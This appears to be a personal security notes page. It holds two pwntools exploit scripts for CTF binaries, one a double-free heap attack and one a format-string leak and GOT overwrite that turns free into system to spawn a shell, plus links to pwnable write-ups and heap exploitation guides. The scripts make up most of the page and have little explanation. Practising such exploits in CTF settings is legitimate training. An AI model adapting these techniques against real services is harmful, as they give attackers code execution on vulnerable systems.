# [0] Blogs
> Note for me.

# [1] Works...

[+] [Google Drive](https://drive.google.com/drive/folders/1Yd3RnKlJunSlAkmUS8o3cVPhGl3GtzmC?usp=share_link) .

[+] [Download folder from git](https://download-directory.github.io/) .

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF("./vuln")
libc = ELF("./libc.so.6")
context.update(binary=elf, log_level="debug")
p = elf.process()
# gdb.attach(
#     p,
#     """
#     breakrva 0x0E0E
#     breakrva 0x0E1A
#     """,
# )
# Allocate, Free
# p = remote("159.89.203.225", "10003")

def Allocate(size, data):
    p.sendlineafter(b"You Choice:", b"1")
    p.sendlineafter(b"Size :", str(int(size)).encode())
    p.sendafter(b"Data :", data)    
    return

def Free(idx):
    p.sendlineafter(b"You Choice:", b"2")
    p.sendlineafter(b"Index :", str(idx).encode())
    return

# 2 | 2000 | +0x40

Allocate(0x60, p64(0) + p64(0x71))   # 0
Allocate(0x60, p64(0) + p64(0x51))   # 1
Allocate(0x60, p64(0)*3 + p64(0x51)) # 2

Free(1)
Free(0)
Free(1)
# 0x00 + 0x10 = 
Allocate(0x60, b"\x10")
Allocate(0x60, b"a")     
Allocate(0x60, b"a")
Allocate(0x60, b"a")

Free(0)
Allocate(0x60, p64(0x10) + p64(0x101))

Free(6)


p.interactive()

```

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF("./vuln")
libc = ELF("./libc.so.6")
context.update(binary=elf, log_level="debug")
p = elf.process()
# gdb.attach(
#     p,
#     """
# 	breakrva 0x10AA
#     breakrva 0x10C2
#     breakrva 0x109E
#     breakrva 0x10B6
#     breakrva 0x0E2D
#     """,
# )
# D E N S printf
# p = remote("159.89.203.225", "10002")
# ATTT{e4sy_fmt_str_pa0}
def newNOTE(idx, size, content):
    p.sendlineafter(b"Choice >", b"N")
    p.sendlineafter(b"Index >", str(idx).encode())
    p.sendlineafter(b"Size >", str(int(size)).encode())
    p.sendlineafter(b"Content >", content)    
    return

def deleteNOTE(idx):
    p.sendlineafter(b"Choice >", b"D")
    p.sendlineafter(b"Index >", str(idx).encode())
    return

def showNOTE(idx):
    p.sendlineafter(b"Choice >", b"S")
    p.sendlineafter(b"Index >", str(idx).encode())
    leak = p.recvuntil(b"\n")
    return leak

def editNOTE(idx, content):
    p.sendlineafter(b"Choice >", b"E")
    p.sendlineafter(b"Index >", str(idx).encode())
    p.sendlineafter(b"Content >", content)
    return


newNOTE(0, 0x200, b"%p-" * 20)
newNOTE(1, 0x100, b"B" * 8)
newNOTE(2, 0x100, b"/bin/sh\x00")
deleteNOTE(1)
leak = showNOTE(0)
leak = leak.split(b"-")
elf_leak = int(leak[10].decode(), 16)
libc_leak = int(leak[14].decode(), 16)
stack_ptr = int(leak[16].decode(), 16)

# 15 - libc | 11 - elf 
# 17 - 43
elf.address = elf_leak - 0x10bb
libc.address = libc_leak - 0x21bf7
rsp = stack_ptr - 0x128
log.info("ELF base address:             " + hex(elf.address))
log.info("Leak (__libc_start_main+231): " + hex(libc_leak))
log.info("Libc base address:            " + hex(libc.address))
log.info("rsp:                          " + hex(rsp))

# fix stack ptr
wr = (rsp + 0x68 + 2) & 0xffff
log.info("wr: " + hex(wr))
pl = b""
pl += f"%{wr}c%17$hn\x00".encode()
editNOTE(0, pl)
showNOTE(0)

tmp = elf.got['free']
tmp = tmp >> 16 & 0xff
log.info("tmp: " + hex(tmp))
pl = b""
pl += f"%{tmp}c%43$hhn\x00".encode()
editNOTE(0, pl)
showNOTE(0)

wr = wr - 2
log.info("wr: " + hex(wr))
pl = b""
pl += f"%{wr}c%17$hn\x00".encode()
editNOTE(0, pl)
showNOTE(0)

tmp = elf.got['free']
tmp = tmp & 0xffff
log.info("tmp: " + hex(tmp))
pl = b""
pl += f"%{tmp}c%43$hn\x00".encode()
editNOTE(0, pl)
showNOTE(0)

# overwrite got free => libc system | para 19
tmp = libc.symbols['system']
tmp = tmp & 0xffff
log.info("tmp: " + hex(tmp))
pl = b""
pl += f"%{tmp}c%19$hn\x00".encode()
editNOTE(0, pl)
showNOTE(0)

tmp = elf.got['free']
tmp = (tmp + 2) & 0xffff
log.info("tmp: " + hex(tmp))
pl = b""
pl += f"%{tmp}c%43$hn\x00".encode()
editNOTE(0, pl)
showNOTE(0)

tmp = libc.symbols['system']
tmp = tmp >> 16 & 0xff
log.info("tmp: " + hex(tmp))
pl = b""
pl += f"%{tmp}c%19$hhn\x00".encode()
editNOTE(0, pl)
showNOTE(0)

deleteNOTE(2)

p.interactive()

```

> Pwnable.tw

- https://www.taintedbits.com/tags/pwnable-tw/
- https://hackmd.io/@wxrdnx/r1CXaFHdv
- https://drx.home.blog/2019/04/20/pwnable-tw-hacknote/

> TetCTF
 
- `2019` https://d4rkn3ss.medium.com/write-up-for-pwnable-challenges-tetctf-2019-a74eb177518e

> ASCIS - SVATTT

- `2017` https://www.youtube.com/watch?v=_EJQKtpQ0oM
 

>Heap

  * `All view heap teachnique exploit` https://0x434b.dev/overview-of-glibc-heap-exploitation-techniques/
  
  * `Heap security check` https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/security_checks

> how2heap 

  * https://hackmd.io/@u1f383/Sy_2pqMAP


> listNOTE-PWNABLE

  * https://uaf.io/tags.html#BCTF-ref

### List video pwnable, exploit, security research, ...

* [BabyTalk#5](https://www.youtube.com/watch?v=94O8wdcvEFM&list=WL&index=249) .

--------------------------------------------------------------------------------


[+] OSCP - https://different-mosquito-965.notion.site/OSCP-ef04a657ca26423d81c1a1fc0b35e147

[+] Java - https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/
